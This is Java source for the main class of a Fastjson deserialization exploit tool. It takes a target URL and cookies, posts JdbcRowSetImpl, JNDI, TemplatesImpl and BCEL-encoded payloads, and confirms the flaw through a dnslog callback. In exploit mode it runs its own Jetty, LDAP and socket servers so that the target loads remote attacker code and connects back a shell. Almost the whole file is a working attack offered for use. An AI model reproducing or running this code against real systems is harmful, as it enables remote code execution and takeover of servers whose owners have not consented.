package superman;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.commons.cli.*;
import sun.misc.BASE64Encoder;
import superman.server.Const;
import superman.server.JettyServer;
import superman.server.LdapServer;
import superman.server.SocketServer;
import superman.utils.ClassUtil;
import superman.utils.DnslogClient;
import superman.utils.FileUtil;
import superman.utils.HttpClient;

import java.io.IOException;
import java.net.*;
import java.util.*;

public class App {
    private static String host = getLocalIpByNetcard();
    private static String url;
    private static String params;
    private static String cookie;
    private static int jettyPort = 18080;
    private static int ldapPort = 11389;
    private static int socketPort = 19999;
    private static List<String> exploitPayloads;
    private static List<String> checkPayloads;
    private static byte[] exploitPayload;//对于需要利用类的字节数组如TemplatesImpl1.tpl
    private static byte[] checkPayload;
    private static boolean exploit = false;


    private static void parseCommandLine(String[] args) {
        Options options = new Options();
        Option helpOption = new Option("h", "help", false, "print help.");
        options.addOption(helpOption);
        Option exploitOption = new Option("e", "exploit", false, "exploit,default is check.");
        options.addOption(exploitOption);
        Option hostOption = new Option("H", "host", true, "The address of server(ip or domain).");
        options.addOption(hostOption);
        Option jettyPortOption = new Option("hp", "http_port", true, "The port of jetty server.");
        options.addOption(jettyPortOption);
        Option ldapPortOption = new Option("lp", "ldap_port", true, "The port of ldap server.");
        options.addOption(ldapPortOption);
        Option socketPortOption = new Option("sp", "socket_port", true, "The port of ldap server.");
        options.addOption(ldapPortOption);
        Option urlOption = new Option("u", "url", true, "The url of fastjson target.");
        //urlOption.setRequired(true);
        options.addOption(urlOption);
        Option cookieOption = new Option("c", "cookie", true, "The cookie of fastjson target.");
        options.addOption(cookieOption);
        Option paramsOption = new Option("p", "params", true, "The params of fastjson target.");
        options.addOption(paramsOption);
        CommandLine commandLine = null;
        try {
            CommandLineParser parser = new DefaultParser();
            commandLine = parser.parse(options, args);
            if (commandLine.hasOption("h")) {
                HelpFormatter hf = new HelpFormatter();
                String formatstr = "java -jar fastjson_exploit.jar [-H ip/vps_ip][-hp http_port][-lp ldap_port][-sp socket_port][-p params_name][-e/--exploit][-h/--help] -u/--url url";
                hf.printHelp(formatstr, "", options, "");
                System.exit(1);
            }
            if (commandLine.hasOption("H")) {
                host = commandLine.getOptionValue("H");
            }
            if (commandLine.hasOption("hp")) {
                jettyPort = Integer.parseInt(commandLine.getOptionValue("hp"));
            }
            if (commandLine.hasOption("lp")) {
                ldapPort = Integer.parseInt(commandLine.getOptionValue("lp"));
            }
            if (commandLine.hasOption("sp")) {
                socketPort = Integer.parseInt(commandLine.getOptionValue("sp"));
            }
            if (commandLine.hasOption("e")) {
                exploit=true;
            }
            url = commandLine.getOptionValue("u");
            if (url == null || url.equals("")) {
                System.err.println("target url can't is null. -h/--help see the help info");
                System.exit(1);
            }
            if (commandLine.hasOption("p")) {
                params = commandLine.getOptionValue("p");
            }
            if (commandLine.hasOption("c")) {
                cookie = commandLine.getOptionValue("c");
            }
        } catch (Exception e) {
            System.err.println("CommandLine parse failed.");
            System.err.println(e.getMessage());
            System.exit(1);
        }

    }

    private static void startServer() {
        try {
            URL codebase = new URL("http://" + host + ":" + jettyPort + "/");
            JettyServer jettyServer = new JettyServer(jettyPort, exploitPayload);
            Thread threadJetty = new Thread(jettyServer);
            threadJetty.start();
            System.out.println("[JETTYSERVER]>> Listening on 0.0.0.0:" + jettyPort);
            Thread threadLDAP = new Thread(new LdapServer(ldapPort, codebase));
            threadLDAP.start();
            System.out.println("[LDAPSERVER]>> Listening on 0.0.0.0:" + ldapPort);
            Thread threadSocket = new Thread(new SocketServer(socketPort));
            threadSocket.start();
            System.out.println("[SOCKETSERVER]>> Listening on 0.0.0.0:" + socketPort);
        } catch (IOException e) {
            System.err.println("start server error.");
            e.printStackTrace();
            System.exit(1);
        }
    }

    private static void exploit(){
        try{
            exploitPayload = ClassUtil.insertSocketServerInfo(host, socketPort);
            startServer();
            Thread.sleep(3000);
            parseExploitPayload();
            sendExploitPayloads();
            Thread.sleep(15000);
            if (!Const.SHELL) {
                System.out.println("-H please input the ip of vps public or the vulnerability not exist.");
                System.exit(1);
            }
        }catch (Exception e){

        }

    }
    private static void parseCheckPayload(String host){
        checkPayloads = new ArrayList<String>();
        checkPayloads.add(FileUtil.readFile("JdbcRowSetImpl1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host  + "/exploit"));
        checkPayloads.add(FileUtil.readFile("JdbcRowSetImpl2.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + "/exploit"));
        checkPayloads.add(FileUtil.readFile("JdbcRowSetImpl3.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + "/exploit"));
        checkPayloads.add(FileUtil.readFile("JdbcRowSetImpl4.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host  + "/exploit"));
        checkPayloads.add(FileUtil.readFile("JdbcRowSetImpl5.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + "/exploit"));
        checkPayloads.add(FileUtil.readFile("JndiDataSourceFactory1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + "/exploit"));
        checkPayloads.add(FileUtil.readFile("SimpleJndiBeanFactory1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + "/exploit"));
        checkPayloads.add(FileUtil.readFile("TemplatesImpl1.tpl").replace("###EVIL_CODE###", new BASE64Encoder().encode(checkPayload).replace("\n", "")));
        checkPayloads.add(FileUtil.readFile("TemplatesImpl2.tpl").replace("###EVIL_CODE###", new BASE64Encoder().encode(checkPayload).replace("\n", "")));
        try {
            checkPayloads.add(FileUtil.readFile("BasicDataSource1.tpl").replace("###EVIL_CODE###", "$$BCEL$$" + Utility.encode(checkPayload, true)));
            checkPayloads.add(FileUtil.readFile("BasicDataSource2.tpl").replace("###EVIL_CODE###", "$$BCEL$$" + Utility.encode(checkPayload, true)));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void check(){
        try{
            System.out.println("[Check]>>get dnslog domain ...");
            DnslogClient dc = new DnslogClient();
            String domain = dc.getdomain();
            System.out.println("[Check]>>dnslog domain:"+domain);
            checkPayload = ClassUtil.insertDomainInfo(domain);
            parseCheckPayload(domain);
            System.out.println("[Check]>>send payloads to target server ...");
            sendCheckPayloads();
            System.out.println("[Check]>>payloads send completed.get dns records ...");
            Thread.sleep(3000);
            String records = dc.getRecords();
            if (records.indexOf(domain) != -1) {
                String ip=records.split(",")[1].replace("\"", "").trim();
                System.out.println("[Check]>>vulnerability exist,server ip:"+ip);
            }else{
                System.out.println("[Check]>>vulnerability not exist.");
            }
        }catch (Exception e){

        }

    }
    private static void sendCheckPayloads() {
        for (String payload : checkPayloads) {
            try {
                Map<String, String> headers =new HashMap<String, String>();
                if(cookie!=null){
                    headers.put("Cookie", cookie);
                }
                if (params != null) {
                    headers.put("Content-Type", "application/x-www-form-urlencoded");
                    Map<String, String> ps = new HashMap<String, String>();
                    ps.put(params, payload);
                    HttpClient.post(url, ps,headers);
                } else {
                    HttpClient.post(url, payload,headers);
                }
                Thread.sleep(500);
            } catch (Exception e) {
                //e.printStackTrace();
            }
        }
    }
    public static void main(String[] args) {
        parseCommandLine(args);
        if(exploit){
            exploit();
        }else{
            check();
        }


    }

    private static void sendExploitPayloads() {
        for (String payload : exploitPayloads) {
            if (Const.SHELL) return;
            try {
                Map<String, String> headers =new HashMap<String, String>();
                if(cookie!=null){
                    headers.put("Cookie", cookie);
                }
                if (params != null) {
                    headers.put("Content-Type", "application/x-www-form-urlencoded");
                    Map<String, String> ps = new HashMap<String, String>();
                    ps.put(params, payload);
                    HttpClient.post(url, ps,headers);
                } else {
                    HttpClient.post(url, payload,headers);
                }
                Thread.sleep(1000);
            } catch (Exception e) {
                //e.printStackTrace();
            }
        }
    }

    private static void parseExploitPayload() {
        exploitPayloads = new ArrayList<String>();
        exploitPayloads.add(FileUtil.readFile("JdbcRowSetImpl1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("JdbcRowSetImpl2.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("JdbcRowSetImpl3.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("JdbcRowSetImpl4.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("JdbcRowSetImpl5.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("JndiDataSourceFactory1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("SimpleJndiBeanFactory1.tpl").replace("###RMI_LDAP_ADDRESS###", "ldap://" + host + ":" + ldapPort + "/exploit"));
        exploitPayloads.add(FileUtil.readFile("TemplatesImpl1.tpl").replace("###EVIL_CODE###", new BASE64Encoder().encode(exploitPayload).replace("\n", "")));
        exploitPayloads.add(FileUtil.readFile("TemplatesImpl2.tpl").replace("###EVIL_CODE###", new BASE64Encoder().encode(exploitPayload).replace("\n", "")));
        try {
            exploitPayloads.add(FileUtil.readFile("BasicDataSource1.tpl").replace("###EVIL_CODE###", "$$BCEL$$" + Utility.encode(exploitPayload, true)));
            exploitPayloads.add(FileUtil.readFile("BasicDataSource2.tpl").replace("###EVIL_CODE###", "$$BCEL$$" + Utility.encode(exploitPayload, true)));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static String getLocalIpByNetcard() {
        try {
            for (Enumeration<NetworkInterface> e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) {
                NetworkInterface item = e.nextElement();
                for (InterfaceAddress address : item.getInterfaceAddresses()) {
                    if (item.isLoopback() || !item.isUp()) {
                        continue;
                    }
                    if (address.getAddress() instanceof Inet4Address) {
                        Inet4Address inet4Address = (Inet4Address) address.getAddress();
                        return inet4Address.getHostAddress();
                    }
                }
            }
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
